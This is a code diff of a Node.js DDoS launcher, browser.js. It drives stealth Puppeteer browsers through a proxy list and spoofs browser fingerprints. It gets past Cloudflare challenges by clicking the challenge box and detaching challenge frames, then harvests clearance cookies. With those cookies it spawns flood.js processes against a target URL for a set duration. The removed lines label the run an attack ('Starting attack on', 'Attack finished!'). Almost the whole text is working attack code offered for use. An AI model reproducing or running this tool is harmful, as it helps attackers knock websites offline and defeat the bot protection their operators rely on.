@@ -1,93 +1,33 @@
 const fs = require("fs");
-const puppeteerCore = require("puppeteer-core");
 const puppeteer = require("puppeteer-extra");
 const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
 const async = require("async");
 const { exec, spawn } = require("child_process");
 
-// Auto-detect Chrome executable
-function findChrome() {
-    const possiblePaths = [
-        '/usr/bin/google-chrome-stable',
-        '/usr/bin/google-chrome',
-        '/usr/bin/chromium-browser',
-        '/usr/bin/chromium',
-        '/usr/bin/chrome',
-        '/usr/local/bin/chromium',
-        '/usr/local/bin/chrome',
-        process.env.CHROME_PATH,
-        process.env.PUPPETEER_EXECUTABLE_PATH
-    ].filter(Boolean);
-    
-    for (const path of possiblePaths) {
-        try {
-            if (fs.existsSync(path)) {
-                return path;
-            }
-        } catch(e) {}
-    }
-    return null;
-}
-
-// Try to find Chrome, if not found try to use puppeteer-core's bundled info
-let chromePath = findChrome();
-
-if (!chromePath) {
-    console.error('Chrome/Chromium not found! Trying alternative methods...');
-    // Try to find in common installation directories
-    const commonDirs = [
-        '/opt/google/chrome/chrome',
-        '/opt/chromium/chromium',
-        '/snap/bin/chromium'
-    ];
-    
-    for (const dir of commonDirs) {
-        try {
-            if (fs.existsSync(dir)) {
-                chromePath = dir;
-                break;
-            }
-        } catch(e) {}
-    }
-}
-
-if (!chromePath) {
-    console.error('\x1b[31m%s\x1b[0m', 'ERROR: Chrome/Chromium not found!');
-    console.error('\x1b[33m%s\x1b[0m', 'Please install Chrome/Chromium using one of these commands:');
-    console.error('\x1b[36m%s\x1b[0m', '  Debian/Ubuntu: apt-get install -y chromium');
-    console.error('\x1b[36m%s\x1b[0m', '  Or download Chrome: npx puppeteer browsers install chrome');
-    console.error('\x1b[36m%s\x1b[0m', '  Or set environment variable: export PUPPETEER_EXECUTABLE_PATH=/path/to/chrome');
-    process.exit(1);
-}
-
-console.log(`\x1b[32m✓\x1b[0m Using Chrome at: ${chromePath}`);
-
-// Use stealth plugin
-const stealthPlugin = puppeteerStealth();
-puppeteer.use(stealthPlugin);
-
 const COOKIES_MAX_RETRIES = 1;
 
-// Colors for logging
+// ──────────────────────────────────────────────────────────────
+// Colors & unified logging with [m85|Browser] prefix
+// ──────────────────────────────────────────────────────────────
 const c = {
-  reset: "\x1b[0m",
-  bright: "\x1b[1m",
-  red: "\x1b[31m",
-  green: "\x1b[32m",
-  yellow: "\x1b[33m",
-  pink: "\x1b[35m",
-  cyan: "\x1b[36m",
-  white: "\x1b[37m",
+  reset:   "\x1b[0m",
+  bright:  "\x1b[1m",
+  red:     "\x1b[31m",
+  green:   "\x1b[32m",
+  yellow:  "\x1b[33m",
+  pink:    "\x1b[35m",
+  cyan:    "\x1b[36m",
+  white:   "\x1b[37m",
 };
 
 const PREFIX = `$${c.bright}$${c.cyan}[m85|Browser]$${c.reset} `;
 
 const symbols = {
-  info: "ℒ",
-  success: "✓",
-  warn: "!",
-  error: "χ",
-  proxy: "ℒ",
+  info:    "ℒ",
+  success: "↓",
+  warn:    "!",
+  error:   "ç",
+  proxy:   "ℒ",
 };
 
 function log(type, text) {
@@ -103,7 +43,7 @@ function log(type, text) {
   console.log(`${PREFIX}${color}${symbol} ${text}${c.reset}`);
 }
 
-const errorHandler = (error) => log("error", error);
+const errorHandler = error => log("error", error);
 process.on("uncaughtException", errorHandler);
 process.on("unhandledRejection", errorHandler);
 
@@ -117,64 +57,65 @@ Array.prototype.remove = function (item) {
 
 async function spoofFingerprint(page) {
   await page.evaluateOnNewDocument(() => {
-    Object.defineProperty(window, "screen", {
+    Object.defineProperty(window, 'screen', {
       value: {
         width: 1920,
         height: 1080,
         availWidth: 1920,
         availHeight: 1080,
         colorDepth: 64,
-        pixelDepth: 64,
-      },
+        pixelDepth: 64
+      }
     });
-    Object.defineProperty(navigator, "userAgent", {
-      value:
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+    Object.defineProperty(navigator, 'userAgent', {
+      value: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'
     });
-    const canvas = document.createElement("canvas");
-    const gl = canvas.getContext("webgl");
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl');
     if (gl) {
-      const originalGetParameter = gl.getParameter;
       gl.getParameter = function (parameter) {
-        if (parameter === gl.VENDOR) return "WebKit";
-        if (parameter === gl.RENDERER) return "Apple GPU";
-        return originalGetParameter(parameter);
+        if (parameter === gl.VENDOR) return 'WebKit';
+        if (parameter === gl.RENDERER) return 'Apple GPU';
+        return gl.getParameter(parameter);
       };
     }
-    Object.defineProperty(navigator, "plugins", {
-      value: [{ name: "Chrome PDF Plugin", filename: "internal-pdf-viewer", description: "Portable Document Format", length: 1 }],
+    Object.defineProperty(navigator, 'plugins', {
+      value: [{ name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer', description: 'Portable Document Format', length: 1 }]
     });
-    Object.defineProperty(navigator, "languages", { value: ["en-US", "en"] });
-    Object.defineProperty(navigator, "webdriver", { get: () => false });
-    Object.defineProperty(navigator, "hardwareConcurrency", { value: 4 });
-    Object.defineProperty(navigator, "deviceMemory", { value: 8 });
-    Object.defineProperty(document, "cookie", {
+    Object.defineProperty(navigator, 'languages', { value: ['en-US', 'en'] });
+    Object.defineProperty(navigator, 'webdriver', { get: () => false });
+    Object.defineProperty(navigator, 'hardwareConcurrency', { value: 4 });
+    Object.defineProperty(navigator, 'deviceMemory', { value: 256 });
+    Object.defineProperty(document, 'cookie', {
       configurable: true,
       enumerable: true,
-      get: () => "",
-      set: () => {},
+      get: function () { return ''; },
+      set: function () { }
     });
-    Object.defineProperty(navigator, "cookiesEnabled", {
+    Object.defineProperty(navigator, 'cookiesEnabled', {
       configurable: true,
       enumerable: true,
-      get: () => true,
-      set: () => {},
+      get: function () { return true; },
+      set: function () { }
     });
-    Object.defineProperty(window, "localStorage", {
+    Object.defineProperty(window, 'localStorage', {
       configurable: true,
       enumerable: true,
       value: {
-        getItem: () => null,
-        setItem: () => {},
-        removeItem: () => {},
-      },
+        getItem: function () { return null; },
+        setItem: function () { },
+        removeItem: function () { }
+      }
     });
-    Object.defineProperty(navigator, "doNotTrack", { value: null });
-    Object.defineProperty(navigator, "maxTouchPoints", { value: 10 });
-    Object.defineProperty(navigator, "language", { value: "en-US" });
-    Object.defineProperty(navigator, "vendorSub", { value: "" });
+    Object.defineProperty(navigator, 'doNotTrack', { value: null });
+    Object.defineProperty(navigator, 'maxTouchPoints', { value: 10 });
+    Object.defineProperty(navigator, 'language', { value: 'en-US' });
+    Object.defineProperty(navigator, 'vendorSub', { value: '' });
   });
 }
+
+const stealthPlugin = puppeteerStealth();
+puppeteer.use(stealthPlugin);
 
 if (process.argv.length < 7) {
   log("error", "Usage: node browser.js <target> <threads> <proxies.txt> <rate> <time>");
@@ -187,34 +128,30 @@ const proxyFile = process.argv[4];
 const rates = process.argv[5];
 const duration = parseInt(process.argv[6], 10);
 
-const sleep = (duration) => new Promise((resolve) => setTimeout(resolve, duration * 1000));
+const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));
 
 const readProxiesFromFile = (filePath) => {
   try {
-    const data = fs.readFileSync(filePath, "utf8");
+    const data = fs.readFileSync(filePath, 'utf8');
     const proxies = data.trim().split(/\r?\n/);
-    return proxies.filter(p => p && p.trim());
+    return proxies;
   } catch (error) {
-    log("error", `Error reading proxies file: ${error.message}`);
+    log("error", `Error reading proxies file: ${error}`);
     return [];
   }
 };
 
 const proxies = readProxiesFromFile(proxyFile);
 
-if (proxies.length === 0) {
-  log("error", "No proxies found in file!");
-  process.exit(1);
-}
-
-log("info", `Loaded ${proxies.length} proxies`);
-
 const userAgents = () => {
   const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
   const browserNames = Array.from({ length: 100 }, (_, i) => `Browser${i + 1}`);
   const browserVersions = Array.from({ length: 100 }, (_, i) => `${i + 1}.0`);
   const operatingSystems = [
-    "Linux", "Windows", "macOS", "Android", "iOS", "FreeBSD", "OpenBSD", "NetBSD", "Solaris", "AIX", "QNX", "Haiku", "ReactOS", "ChromeOS", "AmigaOS", "BeOS", "MorphOS", "OS/2", "Minix", "Unix", "IRIX",
+    "Linux", "Windows", "macOS", "Android", "iOS",
+    "FreeBSD", "OpenBSD", "NetBSD", "Solaris", "AIX", "QNX",
+    "Haiku", "ReactOS", "ChromeOS", "AmigaOS", "BeOS", "MorphOS",
+    "OS/2", "Minix", "Unix", "IRIX", "Kocak", "LOL", "test"
   ];
   const deviceNames = Array.from({ length: 100 }, (_, i) => `Device${i + 1}`);
   const renderingEngines = Array.from({ length: 80 }, (_, i) => `Engine${i + 1}`);
@@ -222,26 +159,50 @@ const userAgents = () => {
   const customFeatures = Array.from({ length: 50 }, (_, i) => `Feature${i + 1}`);
   const featureVersions = Array.from({ length: 80 }, (_, i) => `${i + 1}.0`);
 
-  const macbookUA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36";
+  // Added realistic MacBook user-agent
+  const macbookUA = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36';
 
+  // 30% chance to return MacBook UA, otherwise random
   if (Math.random() < 0.3) {
     return macbookUA;
   }
 
-  return `${getRandomElement(browserNames)}/${getRandomElement(browserVersions)} (${getRandomElement(deviceNames)}; ${getRandomElement(operatingSystems)}) ${getRandomElement(renderingEngines)}/${getRandomElement(engineVersions)} (KHTML, like Gecko) ${getRandomElement(customFeatures)}/${getRandomElement(featureVersions)}`;
+  return `${getRandomElement(browserNames)}/${getRandomElement(browserVersions)} ` +
+         `(${getRandomElement(deviceNames)}; ${getRandomElement(operatingSystems)}) ` +
+         `${getRandomElement(renderingEngines)}/${getRandomElement(engineVersions)} ` +
+         `(KHTML, like Gecko) ${getRandomElement(customFeatures)}/${getRandomElement(featureVersions)}`;
 };
 
-async function detectChallenge(page, browserProxy) {
-  try {
-    const content = await page.content();
-    if (content.includes("challenge-platform") || content.includes("cf-challenge")) {
-      log("pink", `Challenge detected for proxy: ${browserProxy}`);
-      await sleep(5);
-      return true;
+const colors = {
+  COLOR_RED:    "\x1b[31m",
+  COLOR_PINK:   "\x1b[35m",
+  COLOR_WHITE:  "\x1b[37m",
+  COLOR_YELLOW: "\x1b[33m",
+  COLOR_GREEN:  "\x1b[32m",
+  cc:           "\x1b[38;5;57m",
+  COLOR_RESET:  "\x1b[0m"
+};
+
+async function detectChallenge(browser, page, browserProxy) {
+  const title = await page.title();
+  const content = await page.content();
+  if (content.includes("challenge-platform")) {
+    log("pink", `Start Bypass Proxy ℒ ${browserProxy}`);
+    try {
+      await sleep(17);
+      await page.waitForSelector("body > div.main-wrapper > div > div > div > div", { timeout: 10000 });
+      const captchaContainer = await page.$("body > div.main-wrapper > div > div > div > div");
+      if (captchaContainer) {
+        await captchaContainer.click({ offset: { x: 20, y: 20 } });
+      }
+    } catch (error) {
+      log("error", `Error in challenge detection: ${error.message}`);
+    } finally {
+      await sleep(8);
     }
-    return false;
-  } catch (error) {
-    return false;
+  } else {
+    log("warn", `No challenge detected ℒ ${browserProxy}`);
+    await sleep(10);
   }
 }
 
@@ -250,7 +211,6 @@ async function openBrowser(targetURL, browserProxy) {
   const options = {
     headless: "new",
     ignoreHTTPSErrors: true,
-    executablePath: chromePath,
     args: [
       `--proxy-server=http://${browserProxy}`,
       "--no-sandbox",
@@ -260,46 +220,38 @@ async function openBrowser(targetURL, browserProxy) {
       "--test-type",
       `--user-agent=${userAgent}`,
       "--disable-gpu",
-      "--disable-browser-side-navigation",
-      "--disable-dev-shm-usage",
-      "--disable-setuid-sandbox",
-      "--disable-accelerated-2d-canvas",
-      "--disable-gpu-sandbox",
-    ],
+      "--disable-browser-side-navigation"
+    ]
   };
-  
   let browser;
   try {
     browser = await puppeteer.launch(options);
-    const page = await browser.newPage();
-    
+    const [page] = await browser.pages();
+    const client = page._client();
+    page.on("framenavigated", async (frame) => {
+      if (frame.url().includes("challenges.cloudflare.com") && frame._id) {
+        try {
+          await client.send("Target.detachFromTarget", { targetId: frame._id });
+        } catch (error) {
+          log("error", `Error detaching frame: ${error.message}`);
+        }
+      }
+    });
     await spoofFingerprint(page);
-    page.setDefaultNavigationTimeout(30000);
-    page.setDefaultTimeout(30000);
-    
-    await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 30000 });
-    
-    const hasChallenge = await detectChallenge(page, browserProxy);
-    if (hasChallenge) {
-      await sleep(3);
-    }
-    
+    page.setDefaultNavigationTimeout(60 * 1000);
+    await page.goto(targetURL, { waitUntil: "domcontentloaded" });
+    await detectChallenge(browser, page, browserProxy);
     const title = await page.title();
     const cookies = await page.cookies(targetURL);
-    const cookieString = cookies.map((cookie) => cookie.name + "=" + cookie.value).join("; ");
-    
-    log("success", `[${browserProxy}] Title: ${title}`);
-    
     return {
       browser,
       title,
       browserProxy,
-      cookies: cookieString,
-      userAgent,
-      page
+      cookies: cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim(),
+      userAgent
     };
   } catch (error) {
-    log("error", `Error in openBrowser (${browserProxy}): ${error.message}`);
+    log("error", `Error in openBrowser: ${error.message}`);
     if (browser) await browser.close();
     return null;
   }
@@ -311,49 +263,33 @@ async function startThread(targetURL, browserProxy, task, done, retries = 0) {
     done(null, { task, currentTask });
     return;
   }
-  
   let browser = null;
   try {
     const response = await openBrowser(targetURL, browserProxy);
     if (!response) {
       throw new Error("Failed to open browser or retrieve response");
     }
-    
     browser = response.browser;
-    
     if (response.title === "Just a moment..." || response.title === "Attention Required! | Cloudflare") {
-      log("error", `Proxy blocked: ${response.browserProxy} - ${response.title}`);
+      log("error", `Proxy Issue ℒ ${response.title} - Proxy: ${response.browserProxy}`);
       if (browser) await browser.close();
       done(null, { task, currentTask: queue.length() });
       return;
     }
-    
-    const cookiesData = response.cookies;
-    const userAgent = response.userAgent;
-    
-    log("info", `Launching flood with proxy: ${response.browserProxy}`);
-    
-    // Spawn flood process
-    const floodProcess = spawn("node", [
+    const cookies = `[ Title ]: ${response.title}\n[ Proxy ]: ${response.browserProxy}\n[ Cookies ]: ${response.cookies}\n`;
+    log("success", cookies);
+    spawn("node", [
       "flood.js",
       targetURL,
       "100",
       "2",
       response.browserProxy,
       rates,
-      cookiesData,
-      userAgent,
-    ], { 
-      detached: true, 
-      stdio: 'ignore',
-      env: process.env
-    });
-    
-    floodProcess.unref();
-    
+      response.cookies,
+      response.userAgent
+    ]);
     if (browser) await browser.close();
     done(null, { task, currentTask: queue.length() });
-    
   } catch (error) {
     log("error", `Error in startThread: ${error.message}`);
     if (browser) await browser.close();
@@ -366,41 +302,18 @@ const queue = async.queue(function (task, done) {
 }, threads);
 
 async function main() {
-  log("info", `Starting attack on ${targetURL}`);
-  log("info", `Threads: ${threads}, Duration: ${duration}s, Rate: ${rates}`);
-  log("info", `Proxies loaded: ${proxies.length}`);
-  
   for (const browserProxy of proxies) {
     queue.push({ browserProxy });
   }
-  
-  // Run for specified duration
   await sleep(duration);
-  
-  log("warn", "Time's up! Killing all processes...");
   queue.kill();
-  
-  // Kill flood.js processes
-  exec("pkill -f flood.js", (err) => {
-    if (err && err.code !== 1) log("error", `Error killing flood.js: ${err.message}`);
+  exec('pkill -f flood.js', (err) => {
+    if (err) log("error", `Error killing flood.js: ${err.message}`);
   });
-  
-  // Kill chrome processes
-  exec("pkill -f chrome", (err) => {
-    if (err && err.code !== 1) log("error", `Error killing chrome: ${err.message}`);
+  exec('pkill chrome', (err) => {
+    if (err) log("error", `Error killing chrome: ${err.message}`);
   });
-  
-  log("success", "Attack finished!");
-  process.exit(0);
+  process.exit();
 }
-
-// Handle graceful shutdown
-process.on('SIGINT', () => {
-  log("warn", "Received SIGINT. Shutting down...");
-  queue.kill();
-  exec("pkill -f flood.js");
-  exec("pkill -f chrome");
-  process.exit(0);
-});
 
 main();
